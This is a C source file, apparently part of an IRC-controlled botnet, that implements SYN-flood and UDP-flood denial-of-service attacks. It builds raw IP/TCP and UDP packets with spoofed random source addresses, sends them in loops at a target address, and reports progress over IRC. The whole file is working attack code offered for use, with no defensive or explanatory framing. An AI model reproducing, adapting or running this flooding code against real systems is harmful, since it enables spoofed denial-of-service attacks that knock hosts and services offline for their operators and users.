#include "../header/header.h"

uint16_t tcp4_checksum (struct iphdr iphdr, struct tcphdr tcphdr, uint8_t *payload, int payloadlen);

int syn_flood(attack_info *ainfo, irc_info *info) {

	int fd_sock;

	char buffer[50];
	struct sockaddr_in destination;
	struct iphdr *iphdr = NULL;
	struct tcphdr *tcphdr = NULL;
	tcp_pseudo_header pseudo_h;
	iphdr = (struct iphdr *) buffer;
	tcphdr = (struct tcphdr *) (iphdr + 1);

	memset(buffer, 0, sizeof(buffer));

	if ((fd_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		perror("opening socket");
		exit(EXIT_FAILURE);
	}
	// ----- TCP HEADER -----
	// TCP source port and destination
	if (ainfo->d_port)
		tcphdr->dest = htons(ainfo->d_port);
	else
		tcphdr->dest = htons(rand() & 0xFFFF);

	if (ainfo->s_port)
		tcphdr->source = htons(ainfo->s_port);
	else
		tcphdr->source = htons(rand() & 0xFFFF);

	// set the initial sequence of this TCP handshake
	tcphdr->seq = htons(rand() & 0xFFFFFFFF);
	// initial ACK Sequence is zero
	tcphdr->ack_seq = 0;
	// offset without OPTIONS is 5
	tcphdr->doff = 5;
	// reserved, should be zero
	tcphdr->res1 = 0;
	tcphdr->res2 = 0;
	// urgent flag
	tcphdr->urg = 0;
	// set SYN flag to 1 because we are starting a 3-way-handshake
	tcphdr->syn = 1;
	// set RESET flag
	tcphdr->rst = 0;
	// set ACK to zero in initial communication
	tcphdr->ack = 0;
	// FIN flag is zero
	tcphdr->fin = 0;
	// PUSH flag
	tcphdr->psh = 0;
	// window size doesn't matter too much in the 3-way-hs
	tcphdr->window = htons(64);
	// set to zero now, we'll compute cksum before send using tcp pseudo header
	tcphdr->check = 0;
	// URGENT pointer
	tcphdr->urg_ptr = 0;

	// ------ IP HEADER --------
	// version of IPv4
	iphdr->version = 4;
	// header minimum length 5 word = 20 bytes (because we don't set IP options)
	iphdr->ihl = 5;
	// critical path with high throughout ToS 1010 1000
	iphdr->tos = 168;
	// max TTL
	iphdr->ttl = 255;
	// set the layer 3 protocol, TCP is 6 (see /etc/protocols)
	iphdr->protocol = 6;
	// length of this whole datagram
	iphdr->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
	// set some random ip identification, this number only matters if IP segmentation occurs, not in our case
	iphdr->id = rand() % 0xFFFF;
	// set fragment offset, always zero in our case
	iphdr->frag_off = 0;

	// set random source address, this attack implies only random ip's
	iphdr->saddr = htonl(get_random_ip());

	iphdr->daddr = ainfo->d_ip;

	iphdr->check = csum((unsigned short *) buffer, iphdr->tot_len);

	// this value seems redundant when we use with RAW socket, is necessary to use in sendto();
	destination.sin_addr.s_addr = ainfo->d_ip;
	destination.sin_family = AF_INET;

	// we set the most fields here because they don't change over flood process
	pseudo_h.daddr = iphdr->daddr;
	pseudo_h.res = 0;
	pseudo_h.proto = iphdr->protocol;
	pseudo_h.tcp_len = htons(sizeof(struct tcphdr));

	char msg[50];
	for (int i = 1; i <= ainfo->n_pkts; i++) {

		if (ainfo->n_pkts < 10 || (i % (ainfo->n_pkts/10) == 0)) {
			sprintf(msg, "%d packets sent...", i);
			irc_send(msg, strlen(msg), info);
		}

		// we only change if port is zero
		if (!ainfo->d_port)
			tcphdr->dest = rand() & 0xFFFF;

		if (!ainfo->s_port)
			tcphdr->source = rand() & 0xFFF;

		tcphdr->seq = htons(rand() & 0xFFFFFFFF);
		iphdr->saddr = htonl(get_random_ip());

		iphdr->id = rand() % 0xFFFF;
		iphdr->check = csum((unsigned short *) buffer, iphdr->tot_len);

		// we must fill the pseudo header for computing cksum, this must be done at every packet sent
		pseudo_h.saddr = iphdr->saddr;
		tcphdr->check = 0;
		// computes de checksum passing both pseudo header and tcp real header, note that pseudo header is not sent over the wire
		tcphdr->check = tcp_csum((unsigned short *) &pseudo_h, (unsigned short *) tcphdr, sizeof(pseudo_h), sizeof(struct tcphdr));
		if (sendto(fd_sock, buffer, iphdr->tot_len, 0, &destination, sizeof(struct sockaddr_in)) == -1) {
			perror("sending datagram");
			exit(EXIT_FAILURE);
		}
	}

	return EXIT_SUCCESS;
}


int udp_flood(attack_info *ainfo, irc_info *info) {

	int fd_sock;

	// 512 bytes should be enough for our purposes
	char buffer[512];
	struct sockaddr_in destination;
	struct iphdr *iphdr = NULL;
	struct udphdr *udphdr = NULL;
	int payload_len;

	if (ainfo->spoof_ip) {
		iphdr = (struct iphdr *) buffer;
		udphdr = (struct udphdr *) (iphdr + 1);
	} else {
		udphdr = (struct udphdr *) buffer;
	}

	char *payload = (char *) (udphdr + 1);

	memset(buffer, 0, sizeof(buffer));

	if ((fd_sock = socket(AF_INET, SOCK_RAW, ainfo->spoof_ip ? IPPROTO_RAW : IPPROTO_UDP)) < 0) {
		perror("opening socket");
		exit(EXIT_FAILURE);
	}
	payload_len = strlen("Say hello to FURB");
	// putting some payload in the packet
	strncpy(payload, "Say hello to FURB", payload_len);

	// ----- UDP HEADER -----
	// UDP source port and destination
	if (ainfo->d_port)
		udphdr->dest = htons(ainfo->d_port);
	else
		udphdr->dest = htons(rand() & 0xFFFF);

	if (ainfo->s_port)
		udphdr->source = htons(ainfo->s_port);
	else
		udphdr->source = htons(rand() & 0xFFFF);

	// size of this header
	udphdr->len = htons(sizeof(struct udphdr));

	if (ainfo->spoof_ip) {
		// ------ IP HEADER --------
		// version of IPv4
		iphdr->version = 4;
		// header minimum length 5 word = 20 bytes (because we don't set IP options)
		iphdr->ihl = 5;
		// critical path with high throughout ToS 1010 1000
		iphdr->tos = 168;
		// max TTL
		iphdr->ttl = 255;
		// set the layer 3 protocol, UDP is 17 (see /etc/protocols)
		iphdr->protocol = 17;
		// length of this whole datagram
		iphdr->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(payload);
		// set some random ip identification, this number only matters if IP segmentation occurs, not in our case
		iphdr->id = rand() % 0xFFFF;
		// set fragment offset, always zero in our case
		iphdr->frag_off = 0;

		// set source ip and destinations ip
		if (ainfo->s_ip)
			iphdr->saddr = ainfo->s_ip;
		else
			iphdr->saddr = get_random_ip();

		iphdr->daddr = ainfo->d_ip;

		iphdr->check = csum((unsigned short *) buffer, iphdr->tot_len);
	}

	// this value seems redundant when we use with RAW socket, is necessary to use in sendto();
	destination.sin_addr.s_addr = ainfo->d_ip;
	destination.sin_family = AF_INET;

	char msg[50];
	for (int i = 1; i <= ainfo->n_pkts; i++) {

		if (ainfo->n_pkts < 10 || (i % (ainfo->n_pkts/10) == 0)) {
			sprintf(msg, "%d packets sent...", i);
			irc_send(msg, strlen(msg), info);
		}

		// we need to change ports and ip's
		if (i % ainfo->np_chg == 0) {
			// we only change if port is zero
			if (!ainfo->d_port)
				udphdr->dest = rand() & 0xFFFF;

			if (!ainfo->s_port)
				udphdr->source = rand() & 0xFFF;

			if (ainfo->spoof_ip) {
				if (!ainfo->s_ip)
					iphdr->saddr = get_random_ip();

				iphdr->id = rand() % 0xFFFF;
				iphdr->check = csum((unsigned short *) buffer, iphdr->tot_len);
			}
		}
		// flooding UDP packets
		if (sendto(fd_sock, buffer, ainfo->spoof_ip ? iphdr->tot_len : 
			   (sizeof(struct udphdr) + payload_len), 0, &destination, 
			    sizeof(struct sockaddr_in)) == -1) {

			perror("sending datagram");
			exit(EXIT_FAILURE);
		}
	}

	return EXIT_SUCCESS;
}
void print_ip(int ip)
{
    unsigned char bytes[4];
    bytes[0] = ip & 0xFF;
    bytes[1] = (ip >> 8) & 0xFF;
    bytes[2] = (ip >> 16) & 0xFF;
    bytes[3] = (ip >> 24) & 0xFF;
    printf("%d.%d.%d.%d\n", bytes[3], bytes[2], bytes[1], bytes[0]);
}

// generates a random IP (this not guarantee that is a valid IP)
uint32_t get_random_ip() {
	uint32_t ip;

	for (char *p = (char *) &ip; p < (char *)(&ip + 1); p++)
		*p = rand() & 0xFF;

	return ip;
}

unsigned short tcp_csum(unsigned short *psh, unsigned short *tcphdr, int pshwords, int tcpwords) {
	// alloc memory for the merge of headers
	unsigned char *buf = malloc(pshwords + tcpwords);
	unsigned char *ptr = buf;
	unsigned short sum;

	// merge pseudo and real header
	memcpy(buf, psh, pshwords);
	buf += pshwords;
	memcpy(buf, tcphdr, tcpwords);

	// compute checksum of both headers
	sum = csum((unsigned short *) ptr, (pshwords + tcpwords) / 2);

	free(ptr);

        return sum;
}

unsigned short csum(unsigned short *buf, int nwords) {
	unsigned long sum;
        for(sum=0; nwords>0; nwords--)
                sum += *buf++;
        sum = (sum >> 16) + (sum &0xffff);
        sum += (sum >> 16);
        return (unsigned short)(~sum);
}


